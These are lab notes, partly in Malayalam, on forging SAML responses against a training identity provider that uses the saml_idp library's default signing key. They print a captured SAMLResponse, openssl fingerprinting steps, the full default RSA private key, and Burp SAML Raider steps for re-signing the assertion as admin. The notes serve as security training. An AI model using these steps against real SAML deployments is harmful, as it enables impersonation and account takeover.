## Introduction
-->This course details the exploitation of an insecure SAML implementation that allows a malicious user to become another user. The issue comes from the fact that the Identity Provider (IDP) uses the default secret key provided by the library instead of generating a dedicated key.

## The attack
-->Since the IDP uses the key provided by the library and that this key can be retrieved by anyone with access to the source code. It's possible for attackers to generate valid SAMLResponse that will be trusted by the Service Provider.
-->To exploit this issue, you will need to:
-   Register an account on the IDP.
-   Find the library used.
-   Recover the key from the library.
-   Forge a SAMLResponse based on the SAMLRequest provided by the SP.

## Exploitation
-->To perform this attack, you can use one of the following strategies:
-   Build your own SAMLResponse based on the SAMLResponse provided by the IDP. This is probably the most complex way to do it as you will need to precisely understand how the signature is created.
-   Build your own IDP that uses the same private key and pass the SAMLRequest from the Service Provider to your malicious server to get the SAMLResponse that you can then pass to the Service Provider.
-   Build or use a script that leverages a SAML library to build the SAMLResponse for you based on the SAMLRequest form the Service Provider.

## Conclusion
-->This exercise showed you how to leverage default credentials to create a malicious assertion that allows you to be logged in as any users. With more and more enterprises using SSO, it is essential to ensure that this kind of mistakes gets detected and fixed before they get exploited.

# Video Explanation
## Video 1 introduction
-->We know that SAML response are signed with a private key and it will send its public key to the IDP.for ex: `ds:<signatureValue>jlfsdjaflajslfj'alsdjf... `
-->SAML response also contains the certificate that matches the private key used for ex: `<ds:X509Certificate>MIIsdflasdfljsda....</ds:X509Certificate>`
-->Some libraries provide a default private key and certificate to help people setup an IDP
-->The key should never be used in production
-->If you can find this key, you can tamper with the SAMLResponse and resign it ok\
-->To find the key :
- Fingerprint the langugae and framework used like search for libraries used to create IDP in this language
- Retrive the certificate embedded in the SAML response : search for the fingerprint of the certificate
-->The attack :
- Find the key and certificate used
- Intercept and tamper with the SAML response
- Resign the SAML response

## Video 2 finding private key from certificate
-->Here we are going to find the private key by using the certificate from the SAML response
-->lab open chyuka enit regitster with idp click chyuka enit oru account undakuka
-->undakil kazhinj home page il user: admin@libcurl.so  aayi mariyale key kitun enn kanikum.so ini enth venamenal mukalil "Go to service provider" enn kanikm.so ath click chyuka
-->ini mukalil Login with SAML enn kanikum.so ath click chyunathin mumb intercept on aakuka enit ath click chyuka karanam namuk saml response venam.
-->So intecept forward chythondirikumbol request il namuk saml respones kitum :
```saml
......&SAMLResponse=PHNhbWxwOlJlc3BvbnNlIElEPSJfYzVkOTc5YzAtNWMzYy0wMTNiLTIwYWEtMDI0MmFjMTAwMDVhIiBWZXJzaW9uPSIyLjAiIElzc3VlSW5zdGFudD0iMjAyMi0xMi0xMlQxMToxOTozMVoiIERlc3RpbmF0aW9uPSJodHRwOi8vcHRsLTQwZGM2ZjBjLTQwZjliNmEwLmxpYmN1cmwuc286ODAvc2FtbC9jb25zdW1lIiBDb25zZW50PSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6Y29uc2VudDp1bnNwZWNpZmllZCIgSW5SZXNwb25zZVRvPSJfZDNkNjZmNDYtYzkxZC00YmEwLWI2OTctYjM2NGZhNmI3NTZkIiB4bWxuczpzYW1scD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOnByb3RvY29sIj48SXNzdWVyIHhtbG5zPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIj5odHRwOi8vaWRwLXB0bC00MGRjNmYwYy00MGY5YjZhMC5saWJjdXJsLnNvL3NhbWwvYXV0aDwvSXNzdWVyPjxzYW1scDpTdGF0dXM%2BPHNhbWxwOlN0YXR1c0NvZGUgVmFsdWU9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpzdGF0dXM6U3VjY2VzcyIvPjwvc2FtbHA6U3RhdHVzPjxBc3NlcnRpb24geG1sbnM9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iIElEPSJfYzVkOTdjNDAtNWMzYy0wMTNiLTIwYWEtMDI0MmFjMTAwMDVhIiBJc3N1ZUluc3RhbnQ9IjIwMjItMTItMTJUMTE6MTk6MzFaIiBWZXJzaW9uPSIyLjAiPjxJc3N1ZXI%2BaHR0cDovL2lkcC1wdGwtNDBkYzZmMGMtNDBmOWI2YTAubGliY3VybC5zby9zYW1sL2F1dGg8L0lzc3Vlcj48ZHM6U2lnbmF0dXJlIHhtbG5zOmRzPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwLzA5L3htbGRzaWcjIj48ZHM6U2lnbmVkSW5mbyB4bWxuczpkcz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnIyI%2BPGRzOkNhbm9uaWNhbGl6YXRpb25NZXRob2QgQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzEwL3htbC1leGMtYzE0biMiPjwvZHM6Q2Fub25pY2FsaXphdGlvbk1ldGhvZD48ZHM6U2lnbmF0dXJlTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8wNC94bWxkc2lnLW1vcmUjcnNhLXNoYTI1NiI%2BPC9kczpTaWduYXR1cmVNZXRob2Q%2BPGRzOlJlZmVyZW5jZSBVUkk9IiNfYzVkOTdjNDAtNWMzYy0wMTNiLTIwYWEtMDI0MmFjMTAwMDVhIj48ZHM6VHJhbnNmb3Jtcz48ZHM6VHJhbnNmb3JtIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnI2VudmVsb3BlZC1zaWduYXR1cmUiPjwvZHM6VHJhbnNmb3JtPjxkczpUcmFuc2Zvcm0gQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzEwL3htbC1leGMtYzE0biMiPjwvZHM6VHJhbnNmb3JtPjwvZHM6VHJhbnNmb3Jtcz48ZHM6RGlnZXN0TWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8wNC94bWxlbmMjc2hhMjU2Ij48L2RzOkRpZ2VzdE1ldGhvZD48ZHM6RGlnZXN0VmFsdWU%2BRzl5RmdQbWFlclVaa3Qwd2FrUnl3bERscCsvRDlEUis0UXVuYXFHQnRIUT08L2RzOkRpZ2VzdFZhbHVlPjwvZHM6UmVmZXJlbmNlPjwvZHM6U2lnbmVkSW5mbz48ZHM6U2lnbmF0dXJlVmFsdWU%2BaHlwaE4vN29SYm82dWl2QlhHRlJNMk0wNWZCbHlwWU1oeEF2M0FZQ3pWZU9pQW5rbHFESHo0Wlh1aWxFNDUyRnptZWtYNi8ycUE4VnFMU2Y5cUM1NFRuU280L2ZHNk9MeGtaWmE4Z2lVSUhoRVNIdmhBQW4zaWlnRyt5eE1QVDVldDRjRFZVZHIvNCtsQTJLajVKNjVKcHNvWnZpSjFZUUVIeVdXOXhSQ1pZPTwvZHM6U2lnbmF0dXJlVmFsdWU%2BPEtleUluZm8geG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyMiPjxkczpYNTA5RGF0YT48ZHM6WDUwOUNlcnRpZmljYXRlPk1JSURxekNDQXhTZ0F3SUJBZ0lCQVRBTkJna3Foa2lHOXcwQkFRc0ZBRENCaGpFTE1Ba0dBMVVFQmhNQ1FWVXhEREFLQmdOVkJBZ1RBMDVUVnpFUE1BMEdBMVVFQnhNR1UzbGtibVY1TVF3d0NnWURWUVFLREFOUVNWUXhDVEFIQmdOVkJBc01BREVZTUJZR0ExVUVBd3dQYkdGM2NtVnVZMlZ3YVhRdVkyOXRNU1V3SXdZSktvWklodmNOQVFrQkRCWnNZWGR5Wlc1alpTNXdhWFJBWjIxaGFXd3VZMjl0TUI0WERURXlNRFF5T0RBeU1qSXlPRm9YRFRNeU1EUXlNekF5TWpJeU9Gb3dnWVl4Q3pBSkJnTlZCQVlUQWtGVk1Rd3dDZ1lEVlFRSUV3Tk9VMWN4RHpBTkJnTlZCQWNUQmxONVpHNWxlVEVNTUFvR0ExVUVDZ3dEVUVsVU1Ra3dCd1lEVlFRTERBQXhHREFXQmdOVkJBTU1EMnhoZDNKbGJtTmxjR2wwTG1OdmJURWxNQ01HQ1NxR1NJYjNEUUVKQVF3V2JHRjNjbVZ1WTJVdWNHbDBRR2R0WVdsc0xtTnZiVENCbnpBTkJna3Foa2lHOXcwQkFRRUZBQU9CalFBd2dZa0NnWUVBdUJ5d1BObEMxRm9wR0xZZkY5NlNvdGlLOE5qNi9uVzA4NE80b21STWlmenk3eDk1NVJMRXk2NzNxMmFpSk5CM0x2RTZYdmt0OWNHdHh0Tm9PWHcxZzJVdkhLcGxkUWJyNmJPRWpMTmVETlc3ajBvYitKclJ2QVVPSzlDUmdkeXc1TUM2bHdxVlFRNUMxRG5hVC8yZlNCRmphc0JGVFIyNGRFcGZUeThIZktFQ0F3RUFBYU9DQVNVd2dnRWhNQWtHQTFVZEV3UUNNQUF3Q3dZRFZSMFBCQVFEQWdVZ01CMEdBMVVkRGdRV0JCUU5CR21tdDN5dEtwY0phQmFZTmJueVUyeGthekFUQmdOVkhTVUVEREFLQmdnckJnRUZCUWNEQVRBZEJnbGdoa2dCaHZoQ0FRMEVFQllPVkdWemRDQllOVEE1SUdObGNuUXdnYk1HQTFVZEl3U0JxekNCcUlBVURRUnBwcmQ4clNxWENXZ1dtRFc1OGxOc1pHdWhnWXlrZ1lrd2dZWXhDekFKQmdOVkJBWVRBa0ZWTVF3d0NnWURWUVFJRXdOT1UxY3hEekFOQmdOVkJBY1RCbE41Wkc1bGVURU1NQW9HQTFVRUNnd0RVRWxVTVFrd0J3WURWUVFMREFBeEdEQVdCZ05WQkFNTUQyeGhkM0psYm1ObGNHbDBMbU52YlRFbE1DTUdDU3FHU0liM0RRRUpBUXdXYkdGM2NtVnVZMlV1Y0dsMFFHZHRZV2xzTG1OdmJZSUJBVEFOQmdrcWhraUc5dzBCQVFzRkFBT0JnUUFFY1ZVUEJYN3VabXpxWkpmeSt0VVBPVDVJbU5RajhWRTJsZXJobkZqbkdQSG1ISXFocHpnbndIUXVqSmZzL2EzMDlXbTVxd2NDYUMxZU81Y1dqY0cweDNPamRsbHNnWURhdGw1R0F1bXRCeDhKM05oV1JxTlVnaXRDSWtRbHhISXdVZmdRYUN1c2hZZ0RETDVZYklRYSsrZWdDZ3BJWitUMERqNW9SZXcvL0E9PTwvZHM6WDUwOUNlcnRpZmljYXRlPjwvZHM6WDUwOURhdGE%2BPC9LZXlJbmZvPjwvZHM6U2lnbmF0dXJlPjxTdWJqZWN0PjxOYW1lSUQgRm9ybWF0PSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6bmFtZWlkLWZvcm1hdDpwZXJzaXN0ZW50Ij5qb3N1QGpvc3UuY29tPC9OYW1lSUQ%2BPFN1YmplY3RDb25maXJtYXRpb24gTWV0aG9kPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6Y206YmVhcmVyIj48U3ViamVjdENvbmZpcm1hdGlvbkRhdGEgSW5SZXNwb25zZVRvPSJfZDNkNjZmNDYtYzkxZC00YmEwLWI2OTctYjM2NGZhNmI3NTZkIiBOb3RPbk9yQWZ0ZXI9IjIwMjItMTItMTJUMTE6MjI6MzFaIiBSZWNpcGllbnQ9Imh0dHA6Ly9wdGwtNDBkYzZmMGMtNDBmOWI2YTAubGliY3VybC5zbzo4MC9zYW1sL2NvbnN1bWUiPjwvU3ViamVjdENvbmZpcm1hdGlvbkRhdGE%2BPC9TdWJqZWN0Q29uZmlybWF0aW9uPjwvU3ViamVjdD48Q29uZGl0aW9ucyBOb3RCZWZvcmU9IjIwMjItMTItMTJUMTE6MTk6MjZaIiBOb3RPbk9yQWZ0ZXI9IjIwMjItMTItMTJUMTI6MTk6MzFaIj48QXVkaWVuY2VSZXN0cmljdGlvbj48QXVkaWVuY2U%2BaHR0cDovL3B0bC00MGRjNmYwYy00MGY5YjZhMC5saWJjdXJsLnNvOjgwL3NhbWwvYXV0aDwvQXVkaWVuY2U%2BPC9BdWRpZW5jZVJlc3RyaWN0aW9uPjwvQ29uZGl0aW9ucz48QXV0aG5TdGF0ZW1lbnQgQXV0aG5JbnN0YW50PSIyMDIyLTEyLTEyVDExOjE5OjMxWiIgU2Vzc2lvbkluZGV4PSJfYzVkOTdjNDAtNWMzYy0wMTNiLTIwYWEtMDI0MmFjMTAwMDVhIj48QXV0aG5Db250ZXh0PjxBdXRobkNvbnRleHRDbGFzc1JlZj51cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YWM6Y2xhc3NlczpQYXNzd29yZDwvQXV0aG5Db250ZXh0Q2xhc3NSZWY%2BPC9BdXRobkNvbnRleHQ%2BPC9BdXRoblN0YXRlbWVudD48L0Fzc2VydGlvbj48L3NhbWxwOlJlc3BvbnNlPg%3D%3D&RelayState=....
```
-->so ith copy chyth decoder il itt adyam url decode chyanam enit mathrame base64 decode chyan padulu ok
-->ini ith decode chyth kitiya value copy chyuka :
```
<samlp:Response ID="_c5d979c0-5c3c-013b-20aa-0242ac10005a" Version="2.0" IssueInstant="2022-12-12T11:19:31Z" Destination="http://ptl-40dc6f0c-40f9b6a0.libcurl.so:80/saml/consume" Consent="urn:oasis:names:tc:SAML:2.0:consent:unspecified" InResponseTo="_d3d66f46-c91d-4ba0-b697-b364fa6b756d" xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"><Issuer xmlns="urn:oasis:names:tc:SAML:2.0:assertion">http://idp-ptl-40dc6f0c-40f9b6a0.libcurl.so/saml/auth</Issuer><samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status><Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion" ID="_c5d97c40-5c3c-013b-20aa-0242ac10005a" IssueInstant="2022-12-12T11:19:31Z" Version="2.0"><Issuer>http://idp-ptl-40dc6f0c-40f9b6a0.libcurl.so/saml/auth</Issuer><ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#"><ds:SignedInfo xmlns:ds="http://www.w3.org/2000/09/xmldsig#"><ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"></ds:CanonicalizationMethod><ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"></ds:SignatureMethod><ds:Reference URI="#_c5d97c40-5c3c-013b-20aa-0242ac10005a"><ds:Transforms><ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"></ds:Transform><ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"></ds:Transform></ds:Transforms><ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"></ds:DigestMethod><ds:DigestValue>G9yFgPmaerUZkt0wakRywlDlp+/D9DR+4QunaqGBtHQ=</ds:DigestValue></ds:Reference></ds:SignedInfo><ds:SignatureValue>hyphN/7oRbo6uivBXGFRM2M05fBlypYMhxAv3AYCzVeOiAnklqDHz4ZXuilE452FzmekX6/2qA8VqLSf9qC54TnSo4/fG6OLxkZZa8giUIHhESHvhAAn3iigG+yxMPT5et4cDVUdr/4+lA2Kj5J65JpsoZviJ1YQEHyWW9xRCZY=</ds:SignatureValue><KeyInfo xmlns="http://www.w3.org/2000/09/xmldsig#"><ds:X509Data><ds:X509Certificate>MIIDqzCCAxSgAwIBAgIBATANBgkqhkiG9w0BAQsFADCBhjELMAkGA1UEBhMCQVUxDDAKBgNVBAgTA05TVzEPMA0GA1UEBxMGU3lkbmV5MQwwCgYDVQQKDANQSVQxCTAHBgNVBAsMADEYMBYGA1UEAwwPbGF3cmVuY2VwaXQuY29tMSUwIwYJKoZIhvcNAQkBDBZsYXdyZW5jZS5waXRAZ21haWwuY29tMB4XDTEyMDQyODAyMjIyOFoXDTMyMDQyMzAyMjIyOFowgYYxCzAJBgNVBAYTAkFVMQwwCgYDVQQIEwNOU1cxDzANBgNVBAcTBlN5ZG5leTEMMAoGA1UECgwDUElUMQkwBwYDVQQLDAAxGDAWBgNVBAMMD2xhd3JlbmNlcGl0LmNvbTElMCMGCSqGSIb3DQEJAQwWbGF3cmVuY2UucGl0QGdtYWlsLmNvbTCBnzANBgkqhkiG9w0BAQEFAAOBjQAwgYkCgYEAuBywPNlC1FopGLYfF96SotiK8Nj6/nW084O4omRMifzy7x955RLEy673q2aiJNB3LvE6Xvkt9cGtxtNoOXw1g2UvHKpldQbr6bOEjLNeDNW7j0ob+JrRvAUOK9CRgdyw5MC6lwqVQQ5C1DnaT/2fSBFjasBFTR24dEpfTy8HfKECAwEAAaOCASUwggEhMAkGA1UdEwQCMAAwCwYDVR0PBAQDAgUgMB0GA1UdDgQWBBQNBGmmt3ytKpcJaBaYNbnyU2xkazATBgNVHSUEDDAKBggrBgEFBQcDATAdBglghkgBhvhCAQ0EEBYOVGVzdCBYNTA5IGNlcnQwgbMGA1UdIwSBqzCBqIAUDQRpprd8rSqXCWgWmDW58lNsZGuhgYykgYkwgYYxCzAJBgNVBAYTAkFVMQwwCgYDVQQIEwNOU1cxDzANBgNVBAcTBlN5ZG5leTEMMAoGA1UECgwDUElUMQkwBwYDVQQLDAAxGDAWBgNVBAMMD2xhd3JlbmNlcGl0LmNvbTElMCMGCSqGSIb3DQEJAQwWbGF3cmVuY2UucGl0QGdtYWlsLmNvbYIBATANBgkqhkiG9w0BAQsFAAOBgQAEcVUPBX7uZmzqZJfy+tUPOT5ImNQj8VE2lerhnFjnGPHmHIqhpzgnwHQujJfs/a309Wm5qwcCaC1eO5cWjcG0x3OjdllsgYDatl5GAumtBx8J3NhWRqNUgitCIkQlxHIwUfgQaCushYgDDL5YbIQa++egCgpIZ+T0Dj5oRew//A==</ds:X509Certificate></ds:X509Data></KeyInfo></ds:Signature><Subject><NameID Format="urn:oasis:names:tc:SAML:2.0:nameid-format:persistent">josu@josu.com</NameID><SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer"><SubjectConfirmationData InResponseTo="_d3d66f46-c91d-4ba0-b697-b364fa6b756d" NotOnOrAfter="2022-12-12T11:22:31Z" Recipient="http://ptl-40dc6f0c-40f9b6a0.libcurl.so:80/saml/consume"></SubjectConfirmationData></SubjectConfirmation></Subject><Conditions NotBefore="2022-12-12T11:19:26Z" NotOnOrAfter="2022-12-12T12:19:31Z"><AudienceRestriction><Audience>http://ptl-40dc6f0c-40f9b6a0.libcurl.so:80/saml/auth</Audience></AudienceRestriction></Conditions><AuthnStatement AuthnInstant="2022-12-12T11:19:31Z" SessionIndex="_c5d97c40-5c3c-013b-20aa-0242ac10005a"><AuthnContext><AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef></AuthnContext></AuthnStatement></Assertion></samlp:Response>
```
-->enit athoru .xml file ilek aakuka.enit ee file oru browser il open chyuka ie, file:///temp/response.xml  enn kodukuka or right click chyth open with firefox adikuka
-->ivide namuk nerthe paranja pole signature um athupole X509 certificatum xml il kanan patum. so ithile `<ds:X509certificate>....` ile value note chyuka
-->so ee value full copy chyuka :
```
MIIDqzCCAxSgAwIBAgIBATANBgkqhkiG9w0BAQsFADCBhjELMAkGA1UEBhMCQVUxDDAKBgNVBAgTA05TVzEPMA0GA1UEBxMGU3lkbmV5MQwwCgYDVQQKDANQSVQxCTAHBgNVBAsMADEYMBYGA1UEAwwPbGF3cmVuY2VwaXQuY29tMSUwIwYJKoZIhvcNAQkBDBZsYXdyZW5jZS5waXRAZ21haWwuY29tMB4XDTEyMDQyODAyMjIyOFoXDTMyMDQyMzAyMjIyOFowgYYxCzAJBgNVBAYTAkFVMQwwCgYDVQQIEwNOU1cxDzANBgNVBAcTBlN5ZG5leTEMMAoGA1UECgwDUElUMQkwBwYDVQQLDAAxGDAWBgNVBAMMD2xhd3JlbmNlcGl0LmNvbTElMCMGCSqGSIb3DQEJAQwWbGF3cmVuY2UucGl0QGdtYWlsLmNvbTCBnzANBgkqhkiG9w0BAQEFAAOBjQAwgYkCgYEAuBywPNlC1FopGLYfF96SotiK8Nj6/nW084O4omRMifzy7x955RLEy673q2aiJNB3LvE6Xvkt9cGtxtNoOXw1g2UvHKpldQbr6bOEjLNeDNW7j0ob+JrRvAUOK9CRgdyw5MC6lwqVQQ5C1DnaT/2fSBFjasBFTR24dEpfTy8HfKECAwEAAaOCASUwggEhMAkGA1UdEwQCMAAwCwYDVR0PBAQDAgUgMB0GA1UdDgQWBBQNBGmmt3ytKpcJaBaYNbnyU2xkazATBgNVHSUEDDAKBggrBgEFBQcDATAdBglghkgBhvhCAQ0EEBYOVGVzdCBYNTA5IGNlcnQwgbMGA1UdIwSBqzCBqIAUDQRpprd8rSqXCWgWmDW58lNsZGuhgYykgYkwgYYxCzAJBgNVBAYTAkFVMQwwCgYDVQQIEwNOU1cxDzANBgNVBAcTBlN5ZG5leTEMMAoGA1UECgwDUElUMQkwBwYDVQQLDAAxGDAWBgNVBAMMD2xhd3JlbmNlcGl0LmNvbTElMCMGCSqGSIb3DQEJAQwWbGF3cmVuY2UucGl0QGdtYWlsLmNvbYIBATANBgkqhkiG9w0BAQsFAAOBgQAEcVUPBX7uZmzqZJfy+tUPOT5ImNQj8VE2lerhnFjnGPHmHIqhpzgnwHQujJfs/a309Wm5qwcCaC1eO5cWjcG0x3OjdllsgYDatl5GAumtBx8J3NhWRqNUgitCIkQlxHIwUfgQaCushYgDDL5YbIQa++egCgpIZ+T0Dj5oRew//A==
```
-->enit google il search chyuka apol namuk ariyan patum vere ethengilum application ee certificate use chyunundo illayo enn ok
-->ivide angane vere oru applicaiton ee certificate use chyunathayi result illa
-->so ini enthe chyanamenal .pem il oru file undaki ee value eduth oru file il aakuka like certificate.pem 
-->ini open ssl vech chyanam ie,->`openssl x509 -in certificate.pem -noout -fingerprint`
-->ipol ingne command koduth enter adikumbol namuk error verum karanam certificate value namal angane thane paste chyukayan chythath but ath nadakila.athinte format il thane chyanam enale work aaku ie, 5 hiphen itt begin certificate and 5 hiphen itt end certificate kodukanam. athupole athikam pem um 64 bytes aan use chyuanth so namalum athupole aaknam.so vim il ee file open chyuka enit `:%s /.\{64}/&\r/g` chyth enter adichal certificate format il namuk kitum :
```certificate
-----BEGIN CERTIFICATE-----
MIIDqzCCAxSgAwIBAgIBATANBgkqhkiG9w0BAQsFADCBhjELMAkGA1UEBhMCQVUx
DDAKBgNVBAgTA05TVzEPMA0GA1UEBxMGU3lkbmV5MQwwCgYDVQQKDANQSVQxCTAH
BgNVBAsMADEYMBYGA1UEAwwPbGF3cmVuY2VwaXQuY29tMSUwIwYJKoZIhvcNAQkB
DBZsYXdyZW5jZS5waXRAZ21haWwuY29tMB4XDTEyMDQyODAyMjIyOFoXDTMyMDQy
MzAyMjIyOFowgYYxCzAJBgNVBAYTAkFVMQwwCgYDVQQIEwNOU1cxDzANBgNVBAcT
BlN5ZG5leTEMMAoGA1UECgwDUElUMQkwBwYDVQQLDAAxGDAWBgNVBAMMD2xhd3Jl
bmNlcGl0LmNvbTElMCMGCSqGSIb3DQEJAQwWbGF3cmVuY2UucGl0QGdtYWlsLmNv
bTCBnzANBgkqhkiG9w0BAQEFAAOBjQAwgYkCgYEAuBywPNlC1FopGLYfF96SotiK
8Nj6/nW084O4omRMifzy7x955RLEy673q2aiJNB3LvE6Xvkt9cGtxtNoOXw1g2Uv
HKpldQbr6bOEjLNeDNW7j0ob+JrRvAUOK9CRgdyw5MC6lwqVQQ5C1DnaT/2fSBFj
asBFTR24dEpfTy8HfKECAwEAAaOCASUwggEhMAkGA1UdEwQCMAAwCwYDVR0PBAQD
AgUgMB0GA1UdDgQWBBQNBGmmt3ytKpcJaBaYNbnyU2xkazATBgNVHSUEDDAKBggr
BgEFBQcDATAdBglghkgBhvhCAQ0EEBYOVGVzdCBYNTA5IGNlcnQwgbMGA1UdIwSB
qzCBqIAUDQRpprd8rSqXCWgWmDW58lNsZGuhgYykgYkwgYYxCzAJBgNVBAYTAkFV
MQwwCgYDVQQIEwNOU1cxDzANBgNVBAcTBlN5ZG5leTEMMAoGA1UECgwDUElUMQkw
BwYDVQQLDAAxGDAWBgNVBAMMD2xhd3JlbmNlcGl0LmNvbTElMCMGCSqGSIb3DQEJ
AQwWbGF3cmVuY2UucGl0QGdtYWlsLmNvbYIBATANBgkqhkiG9w0BAQsFAAOBgQAE
cVUPBX7uZmzqZJfy+tUPOT5ImNQj8VE2lerhnFjnGPHmHIqhpzgnwHQujJfs/a30
9Wm5qwcCaC1eO5cWjcG0x3OjdllsgYDatl5GAumtBx8J3NhWRqNUgitCIkQlxHIw
UfgQaCushYgDDL5YbIQa++egCgpIZ+T0Dj5oRew//A==
-----END CERTIFICATE-----
```
-->ini oukode ->`openssl x509 -in certificate.pem -noout -fingerprint` chyumbol namuk fingerprint kitum ok
-->ingane chyumbol namuk SHA 1 finger print kitum.so ee value copy chyth google il search chyuka.apol namuk google il saml_idp enna library(in github) kanan patum.ath il keri nokumbol aa certicate refrence chyunathayi kanan patum
-->ithinartham ith develop chytha developer ee same value thane aan production environment ilum use chyunath
-->so github il saml_idp ilek pokuk then ->lib->saml_idp->default.rb .  ivide ninum namuk manasilakan patum namude IDP use chyuna secret key um private key um oke. ee url il aan ath ullath ->https://github.com/saml-idp/saml_idp/blob/master/lib/saml_idp/default.rb
-->ee url il ninum ath manasilakan patum

## Video 3 exploitation
-->nerthe nte continuation aan ith.so namuk kitiya private key copy chyth oru .pem file il  aakuka :
```
-----BEGIN RSA PRIVATE KEY-----
MIICXAIBAAKBgQC4HLA82ULUWikYth8X3pKi2Irw2Pr+dbTzg7iiZEyJ/PLvH3nl
EsTLrverZqIk0Hcu8Tpe+S31wa3G02g5fDWDZS8cqmV1Buvps4SMs14M1buPShv4
mtG8BQ4r0JGB3LDkwLqXCpVBDkLUOdpP/Z9IEWNqwEVNHbh0Sl9PLwd8oQIDAQAB
AoGAQmUGIUtwUEgbXe//kooPc26H3IdDLJSiJtcvtFBbUb/Ik/dT7AoysgltA4DF
pGURNfqERE+0BVZNJtCCW4ixew4uEhk1XowYXHCzjkzyYoFuT9v5SP4cu4q3t1kK
51JF237F0eCY3qC3k96CzPGG67bwOu9EeXAu4ka/plLdsAECQQDkg0uhR/vsJffx
tiWxcDRNFoZpCpzpdWfQBnHBzj9ZC0xrdVilxBgBpupCljO2Scy4MeiY4S1Mleel
CWRqh7RBAkEAzkIjUnllEkr5sjVb7pNy+e/eakuDxvZck0Z8X3USUki/Nm3E/GPP
c+CwmXR4QlpMpJr3/Prf1j59l/LAK9AwYQJBAL9eRSQYCJ3HXlGKXR6v/NziFEY7
oRTSQdIw02ueseZ8U89aQpbwFbqsclq5Ny1duJg5E7WUPj94+rl3mCSu6QECQBVh
0duY7htpXl1VHsSq0H6MmVgXn/+eRpaV9grHTjDtjbUMyCEKD9WJc4VVB6qJRezC
i/bT4ySIsehwp+9i08ECQEH03lCpHpbwiWH4sD25l/z3g2jCbIZ+RTV6yHIz7Coh
gAbBqA04wh64JhhfG69oTBwqwj3imlWF8+jDzV9RNNw=
-----END RSA PRIVATE KEY-----
```
-->ini burp il poi saml raider enna extension install chyuka.enit aa tab il poi namal nerethe copy paste chytha X509 certificate perm file load chyuka apol private key = false enn kanikum. so traditional RSA enn button click chyth ipol copy chytha private key add chyyka apol false mari true aakum
-->ini burp intercept on aakuka enit nerthe pole browser il poi "Login with SAML" click chyuka enit intercept tab il thane saml inte extension undakum ath click chyuka enit namuk saml response kituna request il ee extension use chythit namude peru search chyuka enit namude peru mati admi@libcurl.so kodukuka enit mukalil resign assertion button click chyuka enit send chythal namal admin aayi marum ok